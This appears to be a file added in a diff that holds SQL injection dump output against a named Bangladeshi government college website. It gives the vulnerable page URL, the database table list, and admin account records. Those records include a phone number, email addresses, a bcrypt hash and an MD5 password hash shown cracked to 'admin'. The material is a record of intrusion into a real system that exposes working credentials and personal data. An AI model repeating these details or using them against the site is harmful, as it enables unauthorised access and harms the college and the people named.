@@ -1,0 +1,55 @@
+.gov Government
+
+.bd Bangladesh
+
+Narayanganj Govt. Mohila College
+
+https://www.ngmc.gov.bd/page.php?id=10
+
+the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+
+available databases [1]:
+[+] explore1_io
+
+Database: explore1_ion
+[18 tables]
++--------------------------+
+| admin                    |
+| contact                  |
+| department               |
+| external_link            |
+| library                  |
+| menu                     |
+| page                     |
+| photo_album              |
+| photos                   |
+| scroller                 |
+| site                     |
+| slider                   |
+| students                 |
+| students_attendance      |
+| tbl_admin                |
+| teacher_staff            |
+| teacher_staff_attendance |
+| videos                   |
++--------------------------+
+
+Database: explore1_ion
+Table: tbl_admin
+[1 entry]
++----------+------------+-------------------+--------------------------------------------------------------+
+| fullname | mobile     | email             | password                                                     |
++----------+------------+-------------------+--------------------------------------------------------------+
+| Admin    | 1710676814 | ngmcedu@gmail.com | $2y$10$2hTspAGxfvavGz9k1PAvnuQFRpndAIZM63HP4IFFwybaRguuUzCgG |
++----------+------------+-------------------+--------------------------------------------------------------+
+
+Database: explore1_ion
+Table: admin
+[1 entry]
++-----------+-------------------+------------------------------------------+
+| fullname  | email             | password                                 |
++-----------+-------------------+------------------------------------------+
+| Principal | admin46@admin.com | 21232f297a57a5a743894a0e4a801fc3 (admin) |
++-----------+-------------------+------------------------------------------+
